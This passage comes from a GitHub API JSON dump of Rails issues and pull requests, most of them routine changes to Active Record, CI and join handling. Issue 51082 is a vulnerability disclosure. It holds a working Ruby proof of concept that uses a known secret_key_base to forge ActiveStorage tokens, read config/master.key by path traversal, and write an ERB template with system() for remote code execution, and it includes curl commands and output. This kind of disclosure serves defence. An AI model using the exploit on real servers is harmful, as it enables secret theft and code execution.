alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51084/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51084/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51083",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51083/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51083/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51083/events",
        "html_url": "https://github.com/rails/rails/pull/51083",
        "id": 2134298098,
        "node_id": "PR_kwDNIULOZttxGQ",
        "number": 51083,
        "title": "Add `ActiveRecord::Base.with_connection` as a shortcut",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T12:58:01Z",
        "updated_at": "2024-02-21T15:25:00Z",
        "closed_at": "2024-02-14T13:24:03Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51083",
            "html_url": "https://github.com/rails/rails/pull/51083",
            "diff_url": "https://github.com/rails/rails/pull/51083.diff",
            "patch_url": "https://github.com/rails/rails/pull/51083.patch",
            "merged_at": "2024-02-14T13:24:03Z"
        },
        "body": "Extracted from https://github.com/rails/rails/pull/50793\r\n\r\nThe leased connection is yielded, and for the duration of the block, any call to `ActiveRecord::Base.connection` will yield that same connection.\r\n\r\nThis is useful to perform a few database operations without causing a connection to be leased for the entire duration of the request or job.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51083/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51083/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51082",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51082/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51082/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51082/events",
        "html_url": "https://github.com/rails/rails/issues/51082",
        "id": 2134243246,
        "node_id": "I_kwDNIULOfzX3rg",
        "number": 51082,
        "title": "Path traversal in AcitveStorage, and lead RCE (Need secret_key_base)",
        "user": {
            "login": "ooooooo-q",
            "id": 395584,
            "node_id": "MDQ6VXNlcjM5NTU4NA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/395584?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ooooooo-q",
            "html_url": "https://github.com/ooooooo-q",
            "followers_url": "https://api.github.com/users/ooooooo-q/followers",
            "following_url": "https://api.github.com/users/ooooooo-q/following{/other_user}",
            "gists_url": "https://api.github.com/users/ooooooo-q/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ooooooo-q/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ooooooo-q/subscriptions",
            "organizations_url": "https://api.github.com/users/ooooooo-q/orgs",
            "repos_url": "https://api.github.com/users/ooooooo-q/repos",
            "events_url": "https://api.github.com/users/ooooooo-q/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ooooooo-q/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-14T12:25:26Z",
        "updated_at": "2024-02-18T05:12:53Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "From https://hackerone.com/reports/2334455 (Treated as Informative)\r\n\r\n---\r\n\r\nThe danger of deserialization has been reduced in Rails 7.1 by increasing the number of settings that do not use Marshal in MessageVerifier.\r\n\r\nHowever, another danger remains with AcitveStorage(`service: Disk`), which allows path traversal using the `key` value. However, the attacker must know the value of `secret_key_base`.\r\n\r\n### Steps to reproduce\r\n\r\n```\r\n ruby -v\r\nruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin22]\r\n\r\n rails new disk_traversal_7_1 -G -M -C -A -J -T \r\n=>  Rails 7.1.3\r\n\r\n bin/rails active_storage:install\r\n\r\n RAILS_ENV=production bin/rails db:migrate\r\n```\r\n\r\nedit `config/production.rb`\r\n\r\n```\r\n# config.force_ssl = true\r\n...\r\n\r\nconfig.active_support.message_serializer = :json\r\n```\r\n\r\nstart server\r\n\r\n```\r\n RAILS_ENV=production bundle exec rails s\r\n```\r\n\r\n`traversal.rb`\r\n\r\n```ruby\r\ncontent_disposition = \"inline\"\r\ncontent_type = \"text/plain\"\r\nname = \"disk\"\r\n\r\nsecret_key_base = Rails.application.secret_key_base\r\n\r\nkey_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\r\nsecret = key_generator.generate_key(\"ActiveStorage\")\r\n\r\nserializer =  ActiveStorage.verifier.instance_variable_get(:@serializer)\r\nputs serializer\r\nputs \"--\"\r\n\r\n\r\nkey =\"././../config/master.key\"\r\nverifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\r\nread_token = verifier.generate(\r\n          {\r\n            key: key,\r\n            disposition: content_disposition,\r\n            content_type: content_type,\r\n            service_name: name\r\n          },\r\n          purpose: :blob_key\r\n        )\r\n\r\nputs \"read token:\"\r\nputs \"#{read_token}\"\r\nputs \"read curl: \"\r\nputs  \"curl \\\"http://0.0.0.0:3000/rails/active_storage/disk/#{read_token}/test\\\"\"\r\nputs \"--\"\r\n\r\ntarget_file =\"../app/views/users/show.text.erb\"\r\ncontent = \"<% system('date') %>\"\r\nverifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\r\ntoken_write = verifier.generate(\r\n          {\r\n            key: target_file,\r\n            disposition: content_disposition,\r\n            content_type: content_type,\r\n            content_length: content.bytesize,\r\n            service_name: name\r\n          },\r\n          purpose: :blob_token\r\n        )\r\n\r\nputs \"write target_file:\"\r\nputs \"#{target_file}\"\r\nputs \"write token:\"\r\nputs \"#{token_write}\"\r\nputs \"write curl:\"\r\nputs \"curl -X PUT -H \\\"Content-type: #{content_type}\\\" -d \\\"#{content}\\\" http://0.0.0.0:3000/rails/active_storage/disk/#{token_write}\"\r\n```\r\n\r\n```\r\n RAILS_ENV=production bundle exec rails runner traversal.rb\r\nW, [2024-01-25T22:57:10.036960 #16497]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting \"config.active_record.sqlite3_production_warning=false\".\r\nActiveSupport::Messages::SerializerWithFallback::JsonWithFallback\r\n--\r\nread token:\r\neyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7\r\nread curl:\r\ncurl \"http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test\"\r\n--\r\nwrite target_file:\r\n../app/views/users/show.text.erb\r\nwrite token:\r\neyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e\r\nwrite curl:\r\ncurl -X PUT -H \"Content-type: text/plain\" -d \"<% system('date') %>\" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e\r\n```\r\n\r\nAccess to read curl will get the file at any path, and access to write curl will write to any path and confirm the RCE.\r\n\r\n### Expected behavior\r\n\r\nPath traversal is prevented.\r\n\r\n### Actual behavior\r\n\r\nIf `secret_key_base` is leaked, there is a risk of reading and writing files on the server and thereby an RCE.\r\n\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51082/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51082/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51081",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51081/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51081/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51081/events",
        "html_url": "https://github.com/rails/rails/pull/51081",
        "id": 2134212076,
        "node_id": "PR_kwDNIULOZtpCtw",
        "number": 51081,
        "title": "Refactor some Active Record tests",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T12:07:08Z",
        "updated_at": "2024-02-14T12:20:30Z",
        "closed_at": "2024-02-14T12:20:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51081",
            "html_url": "https://github.com/rails/rails/pull/51081",
            "diff_url": "https://github.com/rails/rails/pull/51081.diff",
            "patch_url": "https://github.com/rails/rails/pull/51081.patch",
            "merged_at": "2024-02-14T12:20:25Z"
        },
        "body": "Mostly extracted from: https://github.com/rails/rails/pull/50793\r\n\r\n- Use `#adapter_name` instead of `#class::ADAPTER_NAME`\r\n- Avoid monkey patching some connection instances\r\n- Ignore SCHEMA queries in some asssertions\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51081/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51081/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51080",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51080/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51080/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51080/events",
        "html_url": "https://github.com/rails/rails/pull/51080",
        "id": 2134017955,
        "node_id": "PR_kwDNIULOZteNfA",
        "number": 51080,
        "title": "Run tests with `--profile` on CI",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-14T10:30:08Z",
        "updated_at": "2024-02-14T21:57:13Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51080",
            "html_url": "https://github.com/rails/rails/pull/51080",
            "diff_url": "https://github.com/rails/rails/pull/51080.diff",
            "patch_url": "https://github.com/rails/rails/pull/51080.patch",
            "merged_at": null
        },
        "body": "~~Debugging why a CI job get stuck is particularly painful as the output doesn't contain any information whatsoever.~~\r\n\r\n~~By enabling `--verbose` we ensure the last line of the CI job is the name of the test that got stuck, helping debug.~~\r\n\r\nSimilarly, it's hard to figure out why a particular job is slow, so enabling `--profile` would make it easy to spot some low hanging fruits to improve CI speed.\r\n\r\nEdit: `--verbose` is a bit too much, so leaving it out for now.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51080/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51080/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51079",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51079/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51079/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51079/events",
        "html_url": "https://github.com/rails/rails/pull/51079",
        "id": 2133847578,
        "node_id": "PR_kwDNIULOZtU5WA",
        "number": 51079,
        "title": "Update Method#duplicable? to be consistent with Ruby 3.4",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T08:54:53Z",
        "updated_at": "2024-02-14T09:33:58Z",
        "closed_at": "2024-02-14T09:33:57Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51079",
            "html_url": "https://github.com/rails/rails/pull/51079",
            "diff_url": "https://github.com/rails/rails/pull/51079.diff",
            "patch_url": "https://github.com/rails/rails/pull/51079.patch",
            "merged_at": "2024-02-14T09:33:57Z"
        },
        "body": "Fix: https://github.com/rails/rails/issues/51075\r\n\r\n`Method` and `UnboundMethod` used to raise on `#dup`, but not `#clone`, this wasn't so much a feature, but a bug.\r\n\r\nIt was fixed in https://github.com/ruby/ruby/pull/9926.\r\n\r\ncc @yahonda",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51079/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51079/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51078",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51078/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51078/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51078/events",
        "html_url": "https://github.com/rails/rails/pull/51078",
        "id": 2133622078,
        "node_id": "PR_kwDNIULOZtIfGA",
        "number": 51078,
        "title": "Fix override existing join types in the query in the `where.associated` method",
        "user": {
            "login": "saleh-alhaddad",
            "id": 60958871,
            "node_id": "MDQ6VXNlcjYwOTU4ODcx",
            "avatar_url": "https://avatars.githubusercontent.com/u/60958871?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/saleh-alhaddad",
            "html_url": "https://github.com/saleh-alhaddad",
            "followers_url": "https://api.github.com/users/saleh-alhaddad/followers",
            "following_url": "https://api.github.com/users/saleh-alhaddad/following{/other_user}",
            "gists_url": "https://api.github.com/users/saleh-alhaddad/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/saleh-alhaddad/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/saleh-alhaddad/subscriptions",
            "organizations_url": "https://api.github.com/users/saleh-alhaddad/orgs",
            "repos_url": "https://api.github.com/users/saleh-alhaddad/repos",
            "events_url": "https://api.github.com/users/saleh-alhaddad/events{/privacy}",
            "received_events_url": "https://api.github.com/users/saleh-alhaddad/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-14T06:16:01Z",
        "updated_at": "2024-02-27T10:08:20Z",
        "closed_at": "2024-02-21T20:10:24Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51078",
            "html_url": "https://github.com/rails/rails/pull/51078",
            "diff_url": "https://github.com/rails/rails/pull/51078.diff",
            "patch_url": "https://github.com/rails/rails/pull/51078.patch",
            "merged_at": "2024-02-21T20:10:24Z"
        },
        "body": "**Motivation / Background**\r\n\r\nCurrently, the `where.associated` method in Rails only allows filtering associated records with an `inner join`, which can potentially override existing join types in the query. The fix ensures that the association is joined using the appropriate join type (either inner join or left outer join) based on the existing joins in the scope. This prevents unintentional overrides of existing join types and ensures consistency in the generated SQL queries.\r\n\r\nExample:\r\n\r\n```ruby\r\n User.left_outer_joins(:orders).where.associated(:orders).count\r\n```\r\nOld query\r\n```sql\r\nSELECT COUNT(*) FROM \"users\" INNER JOIN \"orders\" ON \"orders\".\"user_id\" = \"users\".\"id\" WHERE \"orders\".\"id\" IS NOT NULL\r\n```\r\nafter fixing the issue, the query:\r\nNew Query\r\n```sql\r\nSELECT COUNT(*) FROM \"users\" LEFT OUTER JOIN \"orders\" ON \"orders\".\"user_id\" = \"users\".\"id\" WHERE \"orders\".\"id\" IS NOT NULL\r\n```\r\n\r\nThis enhancement empowers developers with greater flexibility in querying associated data, facilitating scenarios such as:\r\n\r\n- Retrieving posts with authors, even if some posts lack an assigned author (utilizing left_joins).\r\n- Obtaining comments associated with specific users, encompassing orphaned comments without a user (employing multiple joins with varied types).\r\n\r\n**Detail**\r\n\r\nThe pivotal improvement in this Pull Request is the inclusion of a check ensuring that associations are joined using the appropriate join type (either inner join or left outer join) based on existing joins within the scope. This safeguards against unintentional overrides of existing join types and fosters consistency in the generated SQL queries.\r\n\r\n**Additional Information**\r\n\r\nThis refinement is informed by common requirements articulated by Rails developers in various forums and discussions. Analogous functionality is prevalent in certain popular ORM extensions, underscoring its utility. The implementation is crafted to preserve clarity and coherence within the existing codebase.\r\n\r\nNote: This is a draft description and should be adapted to your specific implementation details and the project's context.\r\n\r\nFYI: After merging this PR, I will check the `missing` method and fix this issue in a separate PR alternative same PR.\r\n\r\n**Performance:**\r\n\r\n- Benchmark Before the fix:\r\n\r\n```\r\nBenchmark.ips do |x| \r\n  x.report('joins') { User.joins(:comments, :orders).where.associated(:orders) }\r\n  x.report('left_joins') { User.left_joins(:comments, :orders).where.associated(:orders) }\r\n  x.report('left_outer_joins') { User.left_outer_joins(:comments, :orders).where.associated(:orders) }\r\n  x.report('with out joins') { User.where.associated(:orders) }\r\nend\r\n```\r\n\r\n```info\r\nWarming up --------------------------------------\r\n  joins                        3.260k i/100ms\r\n  left_joins                3.261k i/100ms\r\n  left_outer_joins     3.234k i/100ms\r\n  with out joins         3.518k i/100ms\r\nCalculating -------------------------------------\r\n  joins                         32.610k ( 0.7%) i/s -    166.260k in   5.098730s\r\n  left_joins                 32.240k ( 1.1%) i/s -    163.050k in   5.058117s\r\n  left_outer_joins      32.395k ( 0.5%) i/s -    164.934k in   5.091447s\r\n  with out joins          35.337k ( 0.6%) i/s -    179.418k in   5.077489s\r\n```\r\n\r\n\r\n- Benchmark After the fix:\r\n\r\n```\r\nBenchmark.ips do |x| \r\n  x.report('joins') { User.joins(:comments, :orders).where.associated(:orders) }\r\n  x.report('left_joins') { User.left_joins(:comments, :orders).where.associated(:orders) }\r\n  x.report('left_outer_joins') { User.left_outer_joins(:comments, :orders).where.associated(:orders) }\r\n  x.report('with out joins') { User.where.associated(:orders) }\r\nend\r\n\r\n```\r\n\r\n```\r\nWarming up --------------------------------------\r\n  joins                          3.278k i/100ms\r\n  left_joins                  3.264k i/100ms\r\n  left_outer_joins       3.245k i/100ms\r\n  with out joins           3.434k i/100ms\r\nCalculating -------------------------------------\r\n  joins                           31.688k ( 3.8%) i/s -    160.622k in   5.076856s\r\n  left_joins                   32.432k ( 1.1%) i/s -    163.200k in   5.032760s\r\n  left_outer_joins        32.398k ( 1.4%) i/s -    162.250k in   5.009054s\r\n  with out joins            34.698k ( 1.3%) i/s -    175.134k in   5.048274s\r\n```\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51078/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51078/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51077",
